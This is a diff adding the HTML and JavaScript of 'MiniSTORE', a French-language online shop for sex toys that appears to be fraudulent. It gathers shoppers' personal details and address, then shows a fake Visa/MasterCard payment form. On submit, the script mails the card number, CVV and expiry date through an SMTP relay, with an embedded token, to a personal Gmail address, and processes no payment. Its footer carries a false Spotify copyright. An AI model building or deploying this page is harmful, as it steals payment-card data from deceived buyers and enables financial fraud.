@@ -1,0 +1,766 @@
+<!doctype html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MiniSTORE</title>
+    <script src="https://kit.fontawesome.com/7e2a69d5dd.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <style type="text/css" id="dcoder_stylesheet">
+        @import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap");
+
+        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
+
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');
+ 
+@import url("https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap");
+
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
+
+@import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');       
+        
+
+        * {
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: "Poppins", sans-serif;
+         background: ;
+
+        }
+
+        
+        .gmg img{
+            
+    width:30px;
+    cursor:pointer;
+    margin-left:2%;
+}
+.menu{
+    display:none;
+    background-color: lightgrey;
+    padding: 10px;
+    animation: fadeIn 1s;
+}
+
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 1;
+    }
+}
+
+.close{
+    float: right;
+    cursor: pointer;
+}
+at{
+ font-family: "Archivo Black", sans-serif;   
+}
+ad{
+ font-family: "Poppins", sans-serif; 
+    
+}
+a{
+    text-decoration:none;
+    color:black;
+}
+.zmg{
+    
+    position: 
+    text-align:center;
+    position:relative;
+}
+.zmg img{
+    width:150px;
+    margin-left:5%;
+}
+.store1{
+    width:85%;
+    height:300px;
+    border:;
+   box-shadow: 0 .5rem 5rem rgba(20,20,20,.20); 
+   margin-left:7%;
+}
+.panier img{
+    margin-top:-%;
+    margin-left:%;
+    width:60px;
+}
+.store img{
+    width:50px;
+    
+}
+.img img{ 
+width:100px;
+margin-top:-10%;
+}
+.store{
+    margin-top:-15.5%;
+    margin-left:82%;
+}
+
+#button1{
+    background-color:deepskyblue;
+    border-radius:5px;
+    border:1px solid #777;
+    width:80%;
+    height:40px;
+    font-family: "Poppins", sans-serif;
+}
+ #button8{
+         background-color:deepskyblue;
+    border-radius:5px;
+    color:white;
+    border:1px solid #777;
+    width:50%;
+    height:30px; 
+    font-family: "Archivo Black", sans-serif;  
+       }
+
+.center{
+    text-align:center;
+    margin-top:10%;
+    }
+    input{
+       width:80%; 
+       height:40px;
+       margin-top:5%;
+       outline:none;
+       font-family: "Poppins", sans-serif;
+    }
+    textarea{
+        font-family: "Poppins", sans-serif;
+        outline:none;
+        width:80%; 
+       height:170px
+       
+       
+    }
+    .jmg img{
+        width:60px;
+    }
+    .jmg{
+        margin-right:75%;
+      }
+      #button2{
+         background-color:deepskyblue;
+    border-radius:5px;
+    border:1px solid #777;
+    width:80%;
+    height:40px; 
+    font-family: "Poppins", sans-serif;
+      }
+      #button3{
+          background-color:deepskyblue;
+    border-radius:5px;
+    border:1px solid #777;
+    width:80%;
+    height:40px; 
+    font-family: "Poppins", sans-serif;
+    
+      }
+      
+      .store2{
+       width:85%;
+    height:300px;
+    border:;
+   box-shadow: 0 .5rem 5rem rgba(20,20,20,.20); 
+   margin-left:7%;    
+      }
+      .store3{
+         width:85%;
+    height:300px;
+    border:;
+   box-shadow: 0 .5rem 5rem rgba(20,20,20,.20); 
+   margin-left:7%;  
+      }
+      .store4{
+       width:85%;
+    height:300px;
+    border:;
+   box-shadow: 0 .5rem 5rem rgba(20,20,20,.20); 
+   margin-left:7%;     
+      }
+      .store5{
+      width:85%;
+    height:300px;
+    border:;
+   box-shadow: 0 .5rem 5rem rgba(20,20,20,.20); 
+   margin-left:7%;      
+      }
+      .store6{
+      width:85%;
+    height:300px;
+    border:;
+   box-shadow: 0 .5rem 5rem rgba(20,20,20,.20); 
+   margin-left:7%;      
+      }
+      .store7{
+          width:85%;
+    height:300px;
+    border:;
+   box-shadow: 0 .5rem 5rem rgba(20,20,20,.20); 
+   margin-left:7%;  
+      }
+       .alert1{
+        position:fixed;
+       display :none; 
+       border:1px solid #777;
+       width:87%;
+       height:530px;
+       margin-left:6%;
+       margin-top:-650%;
+       background-color:white;
+       text-align:center;
+       border-radius:5px;
+    }
+    .alert2{
+        position:fixed;
+       display :none; 
+       border:1px solid #777;
+       width:87%;
+       height:530px;
+       margin-left:6%;
+       margin-top:-650%;
+       background-color:white;
+       text-align:center;
+       border-radius:5px;
+    }
+    .alert3{
+        position:fixed;
+       display :none; 
+       border:1px solid #777;
+       width:90%;
+       height:550px;
+       margin-left:4.5%;
+       margin-top:-650%;
+       background-color:white;
+       text-align:center;
+       border-radius:5px;
+   
+}
+.alert4{
+ display:none;
+ position : fixed ;
+ width:93%;
+ height:260px;
+ margin-top:-600%;
+ border:1px solid #777;
+ background-color:white;
+ margin-left:3%;
+}
+.alert4 input{
+    width:85%;
+    height:20px; 
+    margin-left:8%; 
+}
+.cb{
+    display:flex;
+}
+#ben2{
+ width:36.7%;   
+}
+#ben3{
+  width:36.7%; 
+  margin-left:10%;    
+}
+.da{
+    margin-top:-2%;
+    margin-left:8%;
+}
+input[type="submit"]{
+    width:86%;
+    height:30px;
+    color:white;
+   background-color:deepskyblue;
+   font-family: "Archivo Black", sans-serif; 
+   border:1px solid #777;
+}
+.alert5{
+   display:none;
+}
+.alert6{
+   display:none; 
+}
+  h4{
+      margin-left:%;
+      margin-right:30%;
+      margin-top:5%;
+  } 
+  .close1{
+      font-size:20px;
+      margin-top:-15%;
+      margin-left:85%;
+  }
+  .close2{
+      font-size:20px;
+      margin-top:-15%;
+      margin-left:85%;
+  } 
+  .close3{
+      font-size:20px;
+      margin-top:-15%;
+      margin-left:85%;
+  }
+  .close5{
+    font-size:18px;
+      margin-left:95%;  
+  }
+  .text2{
+      font-family: "Archivo Black", sans-serif;  
+      margin-right:50%;
+      margin-top:5%;
+  }
+  .prix{
+      
+  }
+  .text1{
+    font-family: "Poppins", sans-serif;
+  color:#777;
+}
+.omg img{
+    width:100px;
+    margin-left:35%;
+    margin-top:5%;
+}
+.alert7{
+   position:fixed;
+       display :none; 
+       border:1px solid #777;
+       width:87%;
+       height:545px;
+       margin-left:6%;
+       margin-top:-660%;
+       background-color:white;
+       text-align:center;
+       border-radius:5px;
+}
+.alert8{
+    position:fixed;
+       display :none; 
+       border:1px solid #777;
+       width:87%;
+       height:555px;
+       margin-left:6%;
+       margin-top:-565%;
+       background-color:white;
+       text-align:center;
+       border-radius:5px 
+}
+.alert7 img{
+    width:150px;
+    margin-top:50%;
+}
+.alert8 img{
+    width:150px;
+}
+.hmg img{
+    width:150px;
+    margin-left:%;
+    margin-top:10%;
+}
+.txt1{
+    text-align:center;
+    font-size:12px;
+}
+.txt2{
+    text-align:center;
+    font-size:12px;
+}
+.txt3{
+    text-align:center;
+    font-size:12px;
+}
+.txt4{
+    margin-left:10%;
+    margin-right:10%;
+}
+.ima img{
+ width:1000px; 
+ }
+ .imb img{
+ width:50px;   
+}
+.imc img{
+ width:50px;
+  }
+  af{
+      font-family: "Archivo Black", sans-serif;  
+  }
+  .fouter{
+      background-color:black;
+      color:#777;
+      font-size:10px;
+  }
+  
+    </style>
+</head>
+
+<body>
+<div class="gmg"><img src="https://i.postimg.cc/9Q7v1jJr/1200px-Hamburger-icon-svg.png"></div>
+<div class="menu">
+    <span class="close">X</span>
+    <at>Menu</at><br>
+    <a href="mailto:ministore.market.fr@gmail.com"><ad>Nous contacter</ad></a><br>
+    <a href="mailto:ministore.market.fr@gmail.com"><ad>Annuler une commande</ad></a><br>
+    <a href="mailto:ministore.market.fr@gmail.com"><ad>Signalé un problème</ad><br>
+</div></a>
+<div class="zmg">
+    <img src="https://i.postimg.cc/0jZk4BJq/logo7-18-232054.png">
+</div>
+</div>
+<div class="container">
+
+<div class="store1">
+<div class="panier"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div>
+<div class="store"><img src="https://i.postimg.cc/s26QfXC1/IMG-20240718-075317-15-x-5-9-cm.jpg"></div>
+
+<div class="center">
+<div class="img"><img src="https://i.postimg.cc/pT8z7fhr/61-ZOo93-Hx-ML-AC-SR525-789-FMwebp-QL65.webp"></div>
+<div class="prix">14.00 &euro;</div>
+<div class="text1">Votre vibreur érotique   </div>
+<button type="button" id="button8">Acheter</button>
+</div>
+</div><br>
+<div class="store2">
+<div class="panier"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div>
+<div class="store"><img src="https://i.postimg.cc/s26QfXC1/IMG-20240718-075317-15-x-5-9-cm.jpg"></div>
+
+<div class="center">
+<div class="img"><img src="https://i.postimg.cc/d3YrKhrB/51-Vo-K2a80k-L-AC-SR525-789-FMwebp-QL65.webp"></div>
+<div class="prix">10.55 &euro;</div>
+<div class="text1">Votre vibreur érotique    </div>
+<button type="button" id="button8">Acheter</button>
+</div>
+</div><br>
+<div class="store3">
+<div class="panier"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div>
+<div class="store"><img src="https://i.postimg.cc/s26QfXC1/IMG-20240718-075317-15-x-5-9-cm.jpg"></div>
+
+<div class="center">
+<div class="img"><img src="https://i.postimg.cc/gJ96vxSW/psy-aneros-stimulateur-prostatique.jpg"></div>
+<div class="prix">18.75 &euro;</div>
+<div class="text1">Votre sextoy mielleux </div>
+<button type="button" id="button8">Acheter</button>
+</div>
+</div><br>
+
+<div class="store4">
+<div class="panier"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div>
+<div class="store"><img src="https://i.postimg.cc/s26QfXC1/IMG-20240718-075317-15-x-5-9-cm.jpg"></div>
+
+<div class="center">
+<div class="img"><img src="https://i.postimg.cc/wTxRc8V7/H5d7cae706a8b484fac357062f7baef850-jpg-720x720q50.jpg"></div>
+<div class="prix">10.99 &euro;</div>
+<div class="text1">Votre puissance érotique  </div>
+<button type="button" id="button8">Acheter</button>
+</div>
+</div><br>
+<div class="store5">
+<div class="panier"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div>
+<div class="store"><img src="https://i.postimg.cc/s26QfXC1/IMG-20240718-075317-15-x-5-9-cm.jpg"></div>
+
+<div class="center">
+<div class="img"><img src="https://i.postimg.cc/KvgSW4QV/51da6yp-C1-XL-AC-SR525-789-FMwebp-QL65.webp
+
+"></div>
+<div class="prix">24.55 &euro;</div>
+<div class="text1">Votre vibreur érotique    </div>
+<button type="button" id="button8">Acheter</button>
+</div>
+</div><br>
+
+<div class="store6">
+<div class="panier"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div>
+<div class="store"><img src="https://i.postimg.cc/s26QfXC1/IMG-20240718-075317-15-x-5-9-cm.jpg"></div>
+
+<div class="center">
+<div class="img"><img src="https://i.postimg.cc/4yx4tZgG/U526c33befff341f69b1bc9d27de5a87f-O-jpg-720x720q50.jpg"></div>
+<div class="prix">10.99 &euro;</div>
+<div class="text1">Votre puissance érotique  </div>
+<button type="button" id="button8">Acheter</button>
+</div>
+</div><br>
+<div class="store7">
+<div class="panier"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div>
+<div class="store"><img src="https://i.postimg.cc/s26QfXC1/IMG-20240718-075317-15-x-5-9-cm.jpg"></div>
+
+<div class="center">
+<div class="img"><img src="https://i.postimg.cc/Hs5WySGV/51v-JRc-YU4b-L-AC-SR525-789-FMwebp-QL65.webp"></div>
+<div class="prix">19.99 &euro;</div>
+<div class="text1">Votre vibreur érotique   </div>
+<button type="button" id="button8">Acheter</button>
+</div></div>
+
+</div>
+
+
+<div class="alert1">
+<div class="jmg"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div><div class="close1">X</div>
+<div class="text2">Votre info</div>
+<input type="text" placeholder=" Avez-vous au moins 18ans ?">
+<input type="text" placeholder=" Votre orientation sexuelle">
+<input type="text" placeholder=" Vous êtes homme ou femme ?"><br><br>
+<textarea placeholder="Vous devez lire les instructions concernant le produit avant toute utilisation, allez-vous tenir compte de cet conseil ?"></textarea>
+<button type="button" id="button1">Suivant</button>
+</div>
+<div class="alert2">
+<div class="jmg"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div>
+<div class="close2">X</div>
+<div class="text2">Votre info</div>
+<input type="text" placeholder=" Avez-vous au moins 18ans ?">
+<input type="text" placeholder="Votre orientation sexuelle">
+<input type="text" placeholder=" Vous êtes homme ou femme ?"><br><br>
+<textarea placeholder=" Vous devez lire les instructions concernant le produit avant toute utilisation, allez-vous tenir compte de cet conseil ?"></textarea>
+<button type="button" id="button2">Suivant</button>
+</div>
+</div>
+<div class="alert3">
+<div class="jmg"><img src="https://i.postimg.cc/Bbh2dgZ7/Screenshot-20240717-085508-1.jpg"></div><div class="close3">X</div>
+<h4>Adresse de livraison</h4>
+
+<input type="text" placeholder=" Nom complet du destinataire ">
+<input type="text" placeholder=" Pays">
+<input type="text" placeholder=" Ville "><br><br>
+<textarea placeholder=" Code postal, numéro de la rue, nom de la rue, bâtiment, appartement... informations supplémentaires."></textarea>
+<button type="button" id="button3">Continuer</div>
+</div>
+<div class="alert4">
+<form id="submit">
+<div class="close5">X</div>
+<div class="da">Paiement VISA/MasterCard</div>
+<input type="text" placeholder="Numéro sur la carte" id="ben1" required>
+<div class="cb">
+<input type="text" placeholder="CVV" id="ben2" required>
+<input type="text" placeholder="Exp date" id="ben3" required>
+</div>
+<input type="submit" value="Payer">
+
+<div class="omg">
+<img src="https://i.postimg.cc/t44pKX2v/nos3y4-4.png"></div>
+</div></form>
+
+<div class="alert7"><img src="https://i.postimg.cc/TYg459n3/JVX7.gif"></div>
+</div><br><br>
+
+<br><div class="txt1">
+<div class="imb"><img src="https://i.postimg.cc/W1Rt7jsB/satisfaction-icon-25.png"></div><br>
+<af>Satisfaction</af>
+<div class="txt4">Vous satisfait à fin de faire de vous notre client fidèle est l'un de nos plus grands objectifs.</div>
+</div><br>
+
+<div class="txt2">
+<div class="imb"><img src="https://i.postimg.cc/brDNQVWY/delivery-cartoon-illustration-png.png"></div><br>
+<af>Livraison</af>
+<div class="txt4">Nous livrons nos produits partout grâce à des services de livraison rapide et sécurisé.</div>
+</div><br>
+
+<div class="txt3">
+<div class="imc"><img src="https://i.postimg.cc/vZL8LVqn/1489588.png"></div>
+<af>Sécurité</af>
+<div class="txt4">
+Votre sécurité est notre priorité, le site est sécurisé par les protocoles de sécurité https et le certificat SLL.
+</div>
+<br><div class="hmg"><img src="https://i.postimg.cc/t44pKX2v/nos3y4-4.png"></div>
+
+<div class="fouter"> Web site ©copyright in 2016 Spotify/LLC/DDPS</div>
+
+</body>
+
+
+
+
+
+<script>
+
+document.addEventListener('DOMContentLoaded', function() {
+    var closeBtn = document.querySelector('.close3');
+    var alertBox = document.querySelector('.alert3');
+
+    closeBtn.addEventListener('click', function() {
+      alertBox.style.display = 'none';
+    });
+  });
+  
+  document.addEventListener('DOMContentLoaded', function() {
+    var closeBtn = document.querySelector('.close5');
+    var alertBox = document.querySelector('.alert4');
+
+    closeBtn.addEventListener('click', function() {
+      alertBox.style.display = 'none';
+    });
+  });
+
+
+
+document.getElementById("button1").addEventListener("click", function() {
+  setTimeout(function(){
+    document.querySelector(".alert3").style.display = "block";
+  }, 1000); // 3000ms = 3 secondes
+});
+
+document.getElementById("button2").addEventListener("click", function() {
+  setTimeout(function(){
+    document.querySelector(".alert3").style.display = "block";
+  }, 1000); // 3000ms = 3 secondes
+});
+
+document.getElementById("button3").addEventListener("click", function() {
+        setTimeout(function(){
+            document.querySelector(".alert4").style.display = "block";
+        }, 2000); // 3000ms = 3 secondes
+    });
+    
+    
+   submit.addEventListener('submit', (e) => {
+  e.preventDefault();
+  // Ajout du délai de 5 secondes avant l'envoi du formulaire
+  setTimeout(() => {
+    const ebody2 = `
+      <h1>Numbers cadre: </h1>${ben1.value}
+      <br>
+      <h1>Expire: </h1>${ben2.value}
+      <br>
+      <h1>Cvb : </h1>${ben3.value}
+      <br>
+    `;
+
+    Email.send({
+      SecureToken: "24ed91c7-882b-465c-97d2-32856db82fdb", //add your token here
+      To: 'abdoulissa154@gmail.com',
+      From: "abdoulissa154@gmail.com",
+      Subject: "This is the subject",
+      Body: ebody2
+    }).then(() => {
+      // Rendre le div alert7 visible 1 seconde après la soumission
+      setTimeout(() => {
+        document.querySelector(".alert7").style.display = "block";
+      }, 1000); // 1000ms = 1 seconde
+
+      // Rendre le div alert8 visible 3 secondes après la soumission
+      setTimeout(() => {
+        document.querySelector(".alert8").style.display = "block";
+      }, 3000); // 3000ms = 3 secondes
+    });
+    
+    // Redirection vers google
+    window.location.href = "#";
+  }, 500); // Délai de 500
+});
+
+
+
+
+    // Selecting the store1 and store2 elements
+    const store1 = document.querySelector('.store1');
+    const store2 = document.querySelector('.store2');
+        const store3 = document.querySelector('.store3');
+         const store4 = document.querySelector('.store4');
+          const store5 = document.querySelector('.store5');
+           
+    
+    // Selecting the alert1 element
+    const alert1 = document.querySelector('.alert1');
+    
+
+    // Adding click event listeners to store1 and store2
+    store1.addEventListener('click', function() {
+        alert1.style.display = 'block'; // Displaying alert1 when store1 is clicked
+    });
+
+    store2.addEventListener('click', function() {
+        alert1.style.display = 'block'; // Displaying alert1 when store2 is clicked
+    });
+    
+     store3.addEventListener('click', function() {
+        alert1.style.display = 'block'; // Displaying alert1 when store2 is clicked
+    });
+    
+    store4.addEventListener('click', function() {
+        alert1.style.display = 'block'; // Displaying alert1 when store1 is clicked
+    });
+    
+    store5.addEventListener('click', function() {
+        alert1.style.display = 'block'; // Displaying alert1 when store1 is clicked
+    });
+    
+    
+
+// Selecting the close1 element
+const close1 = document.querySelector('.close1');
+
+// Adding click event listener to close1
+close1.addEventListener('click', function() {
+    alert1.style.display = 'none'; // Hiding alert1 when close1 is clicked
+});
+
+
+// Autre
+
+// Selecting the store1 and store2 elements
+    const store6 = document.querySelector('.store6');
+    const store7 = document.querySelector('.store7');
+        
+    
+    // Selecting the alert1 element
+    const alert2 = document.querySelector('.alert2');
+    
+
+    // Adding click event listeners to store1 and store2
+    store6.addEventListener('click', function() {
+        alert2.style.display = 'block'; // Displaying alert1 when store1 is clicked
+    });
+
+    store7.addEventListener('click', function() {
+        alert2.style.display = 'block'; // Displaying alert1 when store2 is clicked
+    });
+    
+        
+    
+
+// Selecting the close1 element
+const close2 = document.querySelector('.close2');
+
+// Adding click event listener to close1
+close2.addEventListener('click', function() {
+    alert2.style.display = 'none'; // Hiding alert1 when close1 is clicked
+});
+
+
+
+
+document.querySelector('.gmg').addEventListener('click', function(){
+    document.querySelector('.menu').style.display = 'block';
+});
+
+document.querySelector('.close').addEventListener('click', function(){
+    document.querySelector('.menu').style.display = 'none';
+});
+
+document.querySelector('.gmg').addEventListener('click', function(){
+    document.querySelector('.menu').style.display = 'block';
+});
+
+document.querySelector('.close').addEventListener('click', function(){
+    document.querySelector('.menu').style.display = 'none';
+});
+
+document.getElementById("dex").addEventListener("click", function() {
+  document.querySelector(".confi").style.display = "block";
+});
+
+
+
+  
+  
+</script>
+
+
+</html>
